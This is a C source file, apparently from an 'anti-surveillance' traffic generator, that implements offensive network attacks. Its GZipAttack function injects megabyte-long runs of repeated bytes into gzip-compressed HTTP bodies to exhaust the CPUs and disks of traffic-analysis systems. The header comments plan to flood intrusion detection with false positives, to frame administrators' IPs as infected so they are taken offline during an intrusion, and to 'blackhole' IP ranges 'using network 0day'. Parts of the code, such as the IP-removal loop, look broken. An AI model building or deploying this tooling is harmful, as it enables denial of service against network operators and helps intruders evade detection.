
/*

various specific types of attacks on TOP of the anti surveillance attacks..

first developed: GZIP attack (causes these programs to have to decompress various pointless data)

2nd: encryption attacks... manipulatin to insert various packets into the NSA's cryptographic cracking services...
     it will flood, or ovverrun these networks with packets which will cause their decrypted services to be rendered
     useless

NIDS attacks... force NIDS to either be overrun, or have so mant false positives
two strategies.. one for mass NID effects.. and another for targeted NIDs (if your hacking a particular machine.. use this
and itll attempt to force issues on other parts of the network..)
also.. if you have any administrators IPs, etc.. you can force NIDs to show that they are infected with viruses, or backdoors
which would force the offline while you proceed further into the network

TCP protocol attacks - (causes traffic disruption)

*** we want a custom zlib so that it can hold context in memory to easily return various outputs from a particular attack
    this will allow us to use it as a 'GZIP cache' although the entire files checksum would be different, and actually contain
    different data

    https://zlib.net/manual.html
    voidpf (*alloc_func) OF((voidpf opaque, uInt items, uInt size));
    typedef void   (*free_func)  OF((voidpf opaque, voidpf address));

    struct internal_state;

    typedef struct z_stream_s {
        z_const Bytef *next_in;     //next input byte 
        uInt     avail_in;  // number of bytes available at next_in 
        uLong    total_in;  // total number of input bytes read so far 

        Bytef    *next_out; // next output byte will go here 
        uInt     avail_out; // remaining free space at next_out 
        uLong    total_out; // total number of bytes output so far 

        z_const char *msg;  // last error message, NULL if no error 
        struct internal_state FAR *state; //not visible by applications 

        alloc_func zalloc;  // used to allocate the internal state 
        free_func  zfree;   // used to free the internal state 
        voidpf     opaque;  // private data object passed to zalloc and zfree 

        int     data_type;  // best guess about the data type: binary or text
                            for deflate, or the decoding state for inflate 
        uLong   adler;      // Adler-32 or CRC-32 value of the uncompressed data 
        uLong   reserved;   // reserved for future use 
    } z_stream;

    typedef z_stream FAR *z_streamp;

    typedef struct gz_header_s {
        int     text;       // true if compressed data believed to be text
        uLong   time;       // modification time
        int     xflags;     // extra flags (not used when writing a gzip file)
        int     os;         // operating system
        Bytef   *extra;     // pointer to extra field or Z_NULL if none
        uInt    extra_len;  // extra field length (valid if extra != Z_NULL)
        uInt    extra_max;  // space at extra (only when reading header)
        Bytef   *name;      // pointer to zero-terminated file name or Z_NULL
        uInt    name_max;   // space at name (only when reading header)
        Bytef   *comment;   // pointer to zero-terminated comment or Z_NULL
        uInt    comm_max;   // space at comment (only when reading header)
        int     hcrc;       // true if there was or will be a header crc 
        int     done;       // true when done reading gzip header (not used
                            // when writin a gzip file)
    } gz_header;

    typedef gz_header FAR *gz_headerp;
    
    
    like ddos all over againn.. when teenagers can use python scripts to blackhole anything online.
    funny enough.. its easier.  you don't even have to installl on 1`00 boxes.
*/


#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <zlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include "network.h"
#include "antisurveillance.h"
#include "packetbuilding.h"
#include "http.h"
#include "attacks.h"
#include "utils.h"
#include "instructions.h"


// This function will perform a GZIP Attack on a body.  I wrote it to take a previously compressed HTTP result, decompress it,
// insert attacks, recompress it, replace the original, and to cache it for future use.  The caching will reuse the same
// packet for X times before retiring it.  
// If you consider generating thousands of connections every second, then it would be pretty tough for platforms to create
// seekers to find similar GZIP responses from packets that have different source ports/ips/ &destinations.  I wouldn't
// believe that reusing a GZIP attack for Y sessions will merrit any decent way of filtering.
// The parameters are attack size, and how many insertions.  The insertions is a rand()%"how many" operation  which would be the maximum
// amount of injections between 1 and that value.  The size will take random characters within the plain text data, mark them, and whenever
// compressing that character it would repeat those specific characters a million times.  It will create an extra megabyte of information
// at that characters location. Compression on top of all other analysis engines used to generate actual intelligence from raw internet
// data would clog those threads, CPUs, and possibly even hard drives up drastically.
int GZipAttack(AS_context *ctx, AS_attacks *aptr, int *size, char **server_body) {
    int i = 0, n = 0, y = 0,r = 0, q = 0;
    char *data = NULL;
    int data_size = 0;
    char *sptr = 0;
    char *header_end_ptr=NULL;
    int zip_size = 0;
    z_stream infstream;
    z_stream outstream;
    char *compressed = NULL;
    //int compressed_size = 0;
    int compressed_in = 0;
    int compressed_out = 0;
    char *buf = NULL;
    int next_i = 0;
    char *zptr = NULL;
    char *compressed_realloc = NULL;
    int compression_max_size = 0;
    int ret = -1;
    int header_size = 0;
    HTTPExtraAttackParameters *options = (HTTPExtraAttackParameters *)aptr->extra_attack_parameters;

    // will contain 0 or 1 where  insertions go
    // this coould be a bitmask whatever.. dont care atm
    char *insertions = NULL;

    // it was taking 8-11minutes at 10%/1megabyte...
    // with only compressing 1 every 10-100 uses kept it between 2 minutes and 2min:10
    // 15 was is 2 minutes 4 seconds for 43k gzip attack injections.. each between 1-5 count of 1megabyte injections
    // the megabytes are the same character randomly in the output 1meg times
    pthread_mutex_lock(&ctx->gzip_cache_mutex);

    if (options != NULL) {
        if (ctx->gzip_cache && ctx->gzip_cache_count > 0) {
            buf = (char *)malloc(ctx->gzip_cache_size );
            if (buf == NULL) {
                pthread_mutex_unlock(&ctx->gzip_cache_mutex);

                return 0;
            }
            memcpy(buf, ctx->gzip_cache, ctx->gzip_cache_size);

            ctx->gzip_cache_count--;

            // free original server body so that we can copy over this cached one fromm the previous gzi attack
            PtrFree(server_body);

            // move the pointer of our coppy for the calling function...
            *server_body = buf;
            // set proper size from cache size
            *size = ctx->gzip_cache_size;

            // keep count (for debugging, remove)
            ctx->total_gzip_count++;

            pthread_mutex_unlock(&ctx->gzip_cache_mutex);

            return 1;
        } else {
            PtrFree(&ctx->gzip_cache);
            ctx->gzip_cache_count = 0;
            ctx->gzip_cache_size = 0;
        }
    }

    //pthread_mutex_unlock(&gzip_cache_mutex);

    // first we unzip it so we can modify..
    // ill do some proper verification later.. but remember? we are supplying the body ourselves..
    // I hoppe if someone doesn't understand whats going on they dont attempt to change things...
    // but by all means ;) keep attacking.
    // *** parse headers correctly using pico http parser phr_*
    if (strstr((char *)*server_body, (char *)"gzip") != NULL) {
        // pointer to the end of the headers..
        sptr = strstr((char *)*server_body, (char *)"\r\n\r\n"); 
        if (sptr != NULL) {
            sptr += 4;

            // need to find out why the server responded with 180 here.. is it a size? related sommehow to gzip? or chunked? deal w it later
            sptr = strstr((char *)sptr, "\r\n");
            sptr += 2;
            // keep information on when the header ends..
            header_end_ptr = sptr;
            header_size = (int)((char *)sptr - (char *)*server_body);
            //printf("\rHeader Size: %d\t\n", header_size);

            // sptr should have the correct location now..lets get the size...
            zip_size = (int)(((*server_body) + *size) - sptr);

            // we must decompress the information first
            // being relaxed coding this.. will be more precise later.. just giving twice the space..
            data = (char *)calloc(1, zip_size * 2);
            if (data == NULL) goto end;

            // simple gzip decompression
            //https://gist.github.com/arq5x/5315739
            infstream.zalloc = Z_NULL;
            infstream.zfree = Z_NULL;
            infstream.opaque = Z_NULL;

            // how many bytes were in server body compressed
            infstream.avail_in = zip_size;
            infstream.next_in = (Bytef *)sptr;

            // max size we allocated for decompression is twice as much as the original size
            // this is acceptable for real files.. injections like our attack could obviously be more..
            infstream.avail_out = (uInt)(zip_size * 2);
            infstream.next_out = (Bytef *)data;

            // execute proper zlib functions for decompression
            inflateInit2(&infstream, 15+16);
            inflate(&infstream, Z_NO_FLUSH);
            inflateEnd(&infstream);
            
            // data contains the decompressed data now.. lets get the size..
            data_size = infstream.total_out;
        }
    }
    

    // if we had no decompressed data.. it wasnt gzip'd and then we can just use the original body
    if (data == NULL) {
        data = *server_body;
        data_size = *size;
    }

    // allocte space for a structure which will contain which locations will get an injection
    insertions = (char *)calloc(1, *size);

    // allocate space for the compressed output...
    compression_max_size = data_size * (600 * 3);
    compressed = (char *)malloc(compression_max_size );

    // buffer for injecting attack
    buf = (char *)calloc(1, options->gzip_size );

    // ensure both were allocated properly..
    if ((insertions == NULL) || (compressed == NULL) || (buf == NULL))
        goto end;

    // how many places will we insert? lets randomly pick how many & mark them
    i = 1 + (rand() % (options->gzip_injection_rand - 1));

    // if its too many for this server body.. lets do it 1 less time than all characters
    if (i > data_size) i = data_size - 1;

    // lets pick random spots for gzip injection attacks
    while (i > 0) {
        n = rand() % *size;

        // make suree we didnt already mark this byte..
        if (insertions[n] == 1)
            continue;

        // mark the location where we would like to insert this attack
        insertions[n] = 1;

        i--;
    }
    
    outstream.zalloc = Z_NULL;
    outstream.zfree = Z_NULL;
    outstream.opaque = Z_NULL;

    // execute proper zlib functions for compression (to insert our attacks)
    if (deflateInit2(&outstream, Z_DEFAULT_COMPRESSION, Z_DEFLATED, 15|16, 8, Z_DEFAULT_STRATEGY) != Z_OK)
        goto end;

    // loop through the entire body finding the locations of where the injections should take place
    sptr = data;
    while (sptr < (data + data_size)) {
        // lets see how many bytes from now before we reach a location we decided to insert an attack
        // i did this just in case it would increase space if i kept the bytes going in 1, or really small..
        // i didnt care to read too far into the zlib source
        zptr = sptr;
        next_i = 0;
        while (!next_i && (zptr <= (data + data_size))) {
            y = zptr - data;
            // if this is a location then we calculate the bytes from the current pointer to it
            if (insertions[y] == 1) {
                next_i = zptr - sptr;

                break;
            }
            zptr++;
        }

        // we dont have anymore injections to insert.. so we compress the rest of the data..
        if (next_i == 0) {
            y = (data + data_size) - sptr;
        } else {
            // we have a location to insert the next at.. so we want to compress everything until that location...
            y = next_i;
        }

        // our current location...
        n = sptr - data;
        // check if we are supposed to insert here...
        if (insertions[n] == 1) {
            // set all of buf (attack buf) to the current character
            memset(buf, *sptr, options->gzip_size);

            outstream.avail_in = options->gzip_size;
            outstream.next_in = (Bytef *)buf;

            // we output it but calculate just so there are no bullshit issues later
            outstream.avail_out = (uInt)(compression_max_size - compressed_out);
            outstream.next_out = (Bytef *)(compressed + compressed_out);

            // run the zlib command so it compresses using it...
            deflate(&outstream, Z_NO_FLUSH);

            // update our information for how many bytes are located in compressed_out..
            compressed_out = outstream.total_out;

            // done this one..
            insertions[n] = 0;

            continue;
        }

        // compress data at sptr by y length
        outstream.avail_in = y;
        outstream.next_in = (Bytef *)sptr;
        outstream.avail_out = (uInt)(compression_max_size - compressed_out);
        outstream.next_out = (Bytef *)(compressed + outstream.total_out);
    
        // keep track of parameters before, and after compression so we can accurately calculate
        n = outstream.total_in;
        q = outstream.total_out;
        i = deflate(&outstream, Z_NO_FLUSH);

        // not enough buffer space.. lets realloc
        if (i == Z_BUF_ERROR) {
            compression_max_size *= 2;
            compressed_realloc = (char *)realloc((void *)compressed, compression_max_size );
            
            // error couldnt allocate
            if (compressed == compressed_realloc)
                goto end;

            compressed = compressed_realloc;
        }

        y = outstream.total_in;
        r = outstream.total_out;

        // update by how many bytes went out..
        compressed_in += (y - n);
        compressed_out = outstream.total_out;

        // increase sptr by the amount of bytes
        sptr += (y - n);

        // we are done.. have to call this to complete the compression..
        if (sptr >= (data + data_size)) {
            outstream.avail_in = 0;
            deflate(&outstream, Z_FINISH);
        }
        
        compressed_out = outstream.total_out;
    }

    deflateEnd(&outstream);

    // If no data was first decompressed earlier, then we would be using the same pointer as we were first given. no need to free that..
    if (data != *server_body) PtrFree(&data);

    // free the attack buffer..
    PtrFree(&buf);

    // re-use the attack buffers pointer to merge the original header, and the compressed data together..
    // *** todo: add gzip content type to a header that wasnt originally compressed
    buf = (char *)malloc(compressed_out + header_size );
    if (buf == NULL) goto end;
    memcpy(buf, *server_body, header_size);
    memcpy(buf + header_size, compressed, compressed_out);

    // free the compression buffer from whenever we built the attack
    PtrFree(&compressed);

    *server_body = buf;
    // so this doesnt get freed again below...
    buf = NULL;
    // set size for calling function to pass on for building http packets
    *size = compressed_out + header_size;


    //pthread_mutex_lock(&gzip_cache_mutex);

    // cache this gzip attack for the next 15 requests of another
    if (ctx->gzip_cache == NULL) {
        ctx->gzip_cache = (char *)malloc(*size );
        if (ctx->gzip_cache != NULL) {
            memcpy(ctx->gzip_cache, *server_body, *size);
            ctx->gzip_cache_size = *size;
            ctx->gzip_cache_count = options->gzip_cache_count;

            ctx->total_gzip_count++;
        }
    }

    //printf("\rgzip injected\t\t\n");
    ret = 1;
end:;

    // free the decompression buffer.. if its still allocated (and wasnt replaced after a successful compression)
    if (ret != 1 && data && data != *server_body) PtrFree(&data);

    // free the insertion (table) we used to randomize our insertions
    PtrFree(&insertions);

    // free the attack buffer (which was used to set the current character X times so it would be compressed by that X size)
    PtrFree(&buf);

    pthread_mutex_unlock(&ctx->gzip_cache_mutex);

    return ret;
}







// frees all extra information being stored in an attack structure
void AttackFreeStructures(AS_attacks *aptr) {
    // free build instructions
    PacketBuildInstructionsFree(&aptr->packet_build_instructions);

    // free packets already prepared in final outgoing structure for AS_queue()
    PacketsFree(&aptr->packets);

    if (aptr->extra_attack_parameters) PtrFree((char **)&aptr->extra_attack_parameters);
}


void AttacksClear(AS_context *ctx) {
    AS_attacks *aptr = ctx->attack_list;

    while (aptr != NULL) {
        pthread_mutex_lock(&aptr->pause_mutex);
        aptr->completed = 1;
        aptr->paused = 1;
        pthread_mutex_unlock(&aptr->pause_mutex);

        aptr = aptr->next;
    }
}

// Queues a TCP/IP session into a general structure.. the function being passed will be called other code to complete the preparations
// for example: HTTP_Create()
int AS_session_queue(AS_context *ctx, int id, uint32_t src, uint32_t dst, int src_port, int dst_port, int count, int interval, int depth, void *function) {
    AS_attacks *aptr = NULL;

    if ((aptr = (AS_attacks *)calloc(1, sizeof(AS_attacks))) == NULL)
        return 0;

    // identifier for the attack..in case we need to find it in queue later
    aptr->id = id;
    aptr->ctx = ctx;
    
    // src&dst information
    aptr->src = src;
    aptr->dst = dst;
    aptr->source_port = src_port;
    aptr->destination_port = dst_port;

    // this is a full blown tcp session
    aptr->type = ATTACK_SESSION;

    // how many times will we replay this session?
    aptr->count = count;
    // how much time in seconds between each replay?
    aptr->repeat_interval = interval;

    // what function will be used to generate this sessions parameters? (ie: HTTP_Create())
    aptr->function = function;

    // initialize a mutex for this structure
    //aptr->pause_mutex = PTHREAD_MUTEX_INITIALIZER;
    pthread_mutex_init(&aptr->pause_mutex, NULL);

    // LIFO i decided it doesnt matter since the attacks are all happening simultaneously...
    // if it becomes a problem its a small fix.  but your queues should also flush properly anyhow..
    aptr->next = ctx->attack_list;
    ctx->attack_list = aptr;

    return 1;
}

// pause by pointer, or identifier
int AS_pause(AS_attacks *attack, int id, int resume) {
    AS_attacks *aptr = attack;
    AS_context *ctx = aptr->ctx;

    // try to find by id if the calling function didnt pass an id
    if (attack == NULL && id) {
        // enumerate through attack queue looking for this ID
        aptr = ctx->attack_list;
        while (aptr != NULL) {
            if (aptr->id == id) break;

            aptr = aptr->next;
        }
    }

    // couldnt find the attack queue
    if (aptr == NULL) {
        return -1;
    }

    pthread_mutex_lock(&aptr->pause_mutex);

    // if so.. its not being used for anotheer pthread...    
    aptr->paused = resume ? 0 : 1;

    pthread_mutex_unlock(&aptr->pause_mutex);

    return 1;
}



#define  AH_ADD_CIDR(a,b,c,d,mask) { BH_add_CIDR(ctx,a,b,c,d,mask); }
// adding CIDR type of IP range to affect
int BH_add_CIDR(AS_context *ctx, int a, int b, int c, int d, int mask) {
    BH_Queue *qptr = NULL;
    int ret = -1;

    if ((qptr = (BH_Queue *)calloc(1,sizeof(BH_Queue))) == NULL) goto end;

    qptr->a = a;
    qptr->b = b;
    qptr->c = c;
    qptr->d = d;
    qptr->netmask = mask;

    // add to blackhole attacks in queue
    qptr->next = ctx->blackhole_queue;
    ctx->blackhole_queue = qptr;

    end:;
    return ret;
}

// adding CIDR type of IP range to affect
int BH_add_IP(AS_context *ctx, uint32_t ip) {
    BH_Queue *qptr = NULL;
    int ret = -1;

    if ((qptr = (BH_Queue *)calloc(1,sizeof(BH_Queue))) == NULL) goto end;

    
    qptr->ip = ip;
    qptr->netmask = 32;

    // add to blackhole attacks in queue
    qptr->next = ctx->blackhole_queue;
    ctx->blackhole_queue = qptr;

    end:;
    return ret;
}

// remove by IP
int BH_del_IP(AS_context *ctx, uint32_t ip) {
    BH_Queue *qptr = ctx->blackhole_queue, *qlast = NULL, *qnext = NULL;
    int ret = 0;

    while (qptr != NULL) {

        // is this the IP in question?
        if (qptr->ip == ip) {
            if (ctx->blackhole_queue == qptr) {
                ctx->blackhole_queue = qptr->next;
            } else {
                qlast->next = qptr->next;
            }

            qlast = qptr;
            qnext = qptr->next;
            free(qptr);
            qptr = qnext;

            ret = 1;
            break;
        }

    }

    return ret;
}


// clear blackhole queue list
void BH_Clear(AS_context *ctx) {
    BH_Queue *qptr = ctx->blackhole_queue, *qnext = NULL;

    while (qptr != NULL) {

        qnext = qptr->next;

        free(qptr);

        qptr = qnext;
    }

    return;
}


// This is the main function which  is to built the packets for BH tactics
// It is meant to be called every iteration similar to AS_perform() but it'll get linked
// in as an attack structure, and using its own custom function like HTTP_Create()


// IPv6:
// Performing blackhole attacks on various hosts across the Internet is a little more difficult.  Ipv4 success rate is above 85%...
// IPv6 will depend on whether or not those hosts configurations can be detected.  A lot of people use the same concepts in choosing their
// network ranges, etc.  It just won't be 85%  but it is 100% if the configuration is guessed... the 85% on IPv4 is due to similar
// and the fact that we dont want to flood other networks with an attack on a particular one... I thikn traceroute, and some other features
// will help in solving to increase chances a little bit
// *** complete blackhole ipv6
int BH_Perform(AS_context *ctx) {
    int ret = -1;
    uint32_t ip = 0;
    char Aip[16];


    BH_Queue *qptr = ctx->blackhole_queue;

    if (ctx->blackhole_paused) {
        ret = 1;
        goto end;
    }


    while (qptr != NULL) {

        if (qptr->ip) {
            ip = qptr->next;
        } else {
            sprintf(Aip, "%d.%d.%d.%d", qptr->a, qptr->b, qptr->c, qptr->d);
            ip = inet_addr(Aip);
        }
        
        qptr = qptr->next;
    }
    



    end:;
    return ret;
}


/*  

#define  AH_ADD_CIDR(a,b,c,d,mask) BH_add_CIDR(a,b,c,d,mask);
typedef struct _blackhole_context {
    struct _blackhole_context;

    int start_ts;
    int last_ts;

    int total;

    uint32_t ip;
    uint32_t **familiars;

    struct in6_addr ip6;
    struct in6_addr **ip6_familiars;
} BlackholeCTX;

// blackhole ips
typedef struct _built_in_attack_hosts {
    struct _built_in_attack_hosts *next;
    char *ipv4_cidr;

} BuiltinAttackParameters;

BH_Queue *
#define AH_ADD_CIDR(a,b,c,d,mask) { }

#include "blackhole_ips.h"

int blackhole_add(uint32_t ip, int minutes) {
    int ret = -1;


    end:;
    return ret;
}

int blackhole_build_instructions(AS_context *ctx, BlackholeCTX *bptr, uint32_t destination) {
    PacketBuildInstructions *iptr = NULL;
    int ret = -1;

    if ((iptr = (PacketBuildInstructions *)calloc(1, sizeof(PacketBuildInstructions))) == NULL) goto end;


    // we wanna create instructions for these blackhole packets so that the engine will change dynamic variables


    // need to rebuild with different parameters every few packets.. either we can do an adjustments ay for caling custom functioons
    // so it doesnt get too messy or a completed function which can trigger building new instructions


    ret = 1;

    end:;
    return ret;
}
*/



// initialize any special attacks in this source file
void attacks_init(AS_context *ctx) {
    pthread_mutexattr_t attr;

    // GZIP initialization
    if (!ctx->gzip_initialized) {
        ctx->gzip_initialized = 1;
        
        pthread_mutexattr_setprotocol(&attr, PTHREAD_PRIO_NONE);
        pthread_mutexattr_setprioceiling(&attr, 0); 

        pthread_mutex_init(&ctx->gzip_cache_mutex, NULL);

        
    }

#ifdef BUILTIN_BLACKHOLE_IPS
    // include ranges we wish to destroy using network 0day
    #include "blackhole_ips.h"
#endif

    return;
}


// find by criteria...
AS_attacks *AttackFind(AS_context *ctx, int id, char *source_ip, char *destination_ip, char *any_ip, int source_port, int destination_port, int any_port, int age) {
    AS_attacks *aptr = ctx->attack_list;
    uint32_t src = 0, dst = 0, any = 0;
    int ts = 0;
    struct timeval tv;
    struct timeval time_diff;
    int src_is_ipv6 = 0, dst_is_ipv6 = 0;
    int any_is_ipv6 = 0;
    uint32_t destination_ipv4 = 0;
    struct in6_addr destination_ipv6;
    struct in6_addr source_ipv6;
    uint32_t source_ipv4 = 0;
    uint32_t any_ipv4 = 0;
    struct in6_addr any_ipv6;

    // setup for ipv4, and ipv6
    if (source_ip)
        IP_prepare(source_ip, &source_ipv4, &source_ipv6, &src_is_ipv6);
    if (destination_ip)
        IP_prepare(destination_ip, &destination_ipv4, &destination_ipv6, &dst_is_ipv6);
    if (any_ip)
        IP_prepare(any_ip, &any_ipv4, &any_ipv6, &any_is_ipv6);

    while (aptr != NULL) {
        // does this attack match?
        if (id && aptr->id == id) break;
        if (any) {
            if (!any_is_ipv6) {
                if (CompareIPv6Addresses(&aptr->src6, &any_ipv6) || CompareIPv6Addresses(&aptr->dst6, &destination_ipv6))
                    break;
            } else {
                if ((aptr->dst == any_ipv4) || (aptr->src == any_ipv4)) break;
            }
        }

        if (source_ip) {
            if (!src_is_ipv6) {
                if (CompareIPv6Addresses(&aptr->src6, &source_ipv6))
                    break;
            } else {
                if ((aptr->src == source_ipv4))
                    break;
            }
        }

        if (destination_ip) {
            if (!dst_is_ipv6) {
                if (CompareIPv6Addresses(&aptr->dst6, &destination_ipv6))
                    break;
            } else {
                if (aptr->dst == destination_ipv4)
                    break;
            }
        }

        if (destination_port && aptr->destination_port == destination_port) break;
        if (source_port && aptr->source_port == source_port) break;

        // find connection by age
        if (age) {
            gettimeofday(&tv, NULL);
            timeval_subtract(&time_diff, &aptr->ts, &tv);
            if (time_diff.tv_sec > age) {
                break;
            }
        }

        aptr = aptr->next;
    }

    return aptr;
}


// Merge two attack structures together.. mainly for putting DNS, and WWW sessions into a single (so you can push live DNS to wire, and then
// after those packets are completed, then you could flush the session).. right now if thhey are separated.. the DNS might not complete before
// the www session gets pushed to the wire..
// Just making sure there is no way to solve these attacks fromm the mass surveillance point of view...
// Moves instructions from source into dst.. and removes the rest of src's structure

// beware: TCP ACK/SEQ etc will get messed up...maybe ill redesign structures to have another encapsulation with the build instructions
//   which  will bring those values (base ones, etc needed for modification) along when merged..
// another option is to allow moving one attack into another but keeping the other ordered..
// I just realized if you move DNS into WWW itll be BEHIND www... and if you move WWW into DNS then it wont rewrite ACK/SEQ, and other values
// properly in all cases.. so ill have to revisit this ***

// *** instead of merge im considering a 'prerequisite' variable to show that DNS should be handled before WWW on next interval
int MergeAttacks(AS_attacks *dst, AS_attacks *src) {
    if (!dst || !src || !src->packet_build_instructions) return 0;
    // link the source instructions into the destination
    L_link_ordered((LINK **)&dst->packet_build_instructions, (LINK *)src->packet_build_instructions);

    // unlink from source structure
    src->packet_build_instructions = NULL;

    // mark the source's structure as completed so that it gets freed gracefully
    src->completed = 1;
    
    return 1;
}